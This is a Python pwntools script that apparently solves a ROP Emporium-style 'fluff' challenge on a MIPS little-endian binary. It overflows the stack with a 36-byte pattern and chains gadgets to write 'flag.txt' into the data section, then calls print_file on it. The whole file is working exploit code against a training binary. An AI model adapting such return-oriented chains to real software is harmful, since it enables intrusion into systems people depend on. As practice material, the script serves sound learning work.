from pwn import *

splash()
elf = context.binary = ELF("./fluff_mipsel")


class ROP:
    gadget1 = 0x00400aac  # lw $ra, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x28;
    gadget2 = 0x0040099c  # lw t9,4(sp); sw	s1,0(s0); jalr $t9; addi $sp, $sp, 8;
    lw_a0   = 0x004009ac  # lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; addi $sp, $sp, 0xc;


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    elif args.GDB:
        return gdb.debug(elf.path)
    else:
        return remote(args.HOST, args.PORT)


def solve():
    io = conn()

    padding = cyclic(36)

    payload = [
        padding,
        ROP.gadget1,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        elf.sym.data_start,
        b"flag",
        ROP.gadget2,
        0xDEADBEEF,
        ROP.gadget1,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        elf.sym.data_start + 4,
        b".txt",
        ROP.gadget2,
        0xDEADBEEF,
        ROP.lw_a0,
        0xDEADBEEF,
        elf.sym.print_file,
        elf.sym.data_start
    ]

    io.sendline(flat(payload))
    io.interactive()


if __name__ == "__main__":
    solve()